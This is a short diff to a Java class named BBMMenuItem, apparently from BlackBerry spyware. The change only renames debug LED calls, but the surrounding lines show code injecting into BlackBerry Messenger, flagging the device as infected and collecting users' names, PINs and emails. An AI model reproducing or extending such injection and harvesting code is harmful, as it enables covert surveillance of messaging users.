@@ -124,7 +124,7 @@ public class BBMMenuItem extends ApplicationMenuItem {
                 conversationScreen.setBBM(bbmApplication);
                 //#ifdef DEBUG
                 debug.info("BBM INJECTED!");
-                debug.ledStart(Debug.COLOR_GREEN);
+                debug.led(Debug.COLOR_GREEN);
                 //#endif
 
                 AppInjectorBBM.getInstance().setInfected();
@@ -132,7 +132,7 @@ public class BBMMenuItem extends ApplicationMenuItem {
             } else {
                 //#ifdef DEBUG
                 debug.warn("BBM NOT INJECTED!");
-                debug.ledStart(Debug.COLOR_RED);
+                debug.led(Debug.COLOR_RED);
                 //#endif
             }
 
@@ -141,7 +141,7 @@ public class BBMMenuItem extends ApplicationMenuItem {
         } catch (Exception ex) {
             //#ifdef DEBUG
             debug.warn("injectBBM:" + ex.toString());
-            debug.ledStart(Debug.COLOR_RED);
+            debug.led(Debug.COLOR_RED);
             //#endif
         }
 
@@ -207,7 +207,7 @@ public class BBMMenuItem extends ApplicationMenuItem {
                     users.put(user.toLowerCase(), new User(user, pin, email));
 
                     //#ifdef DEBUG
-                    debug.ledStart(Debug.COLOR_ORANGE);
+                    debug.led(Debug.COLOR_ORANGE);
                     //#endif
                 }
                 //#ifdef DEBUG
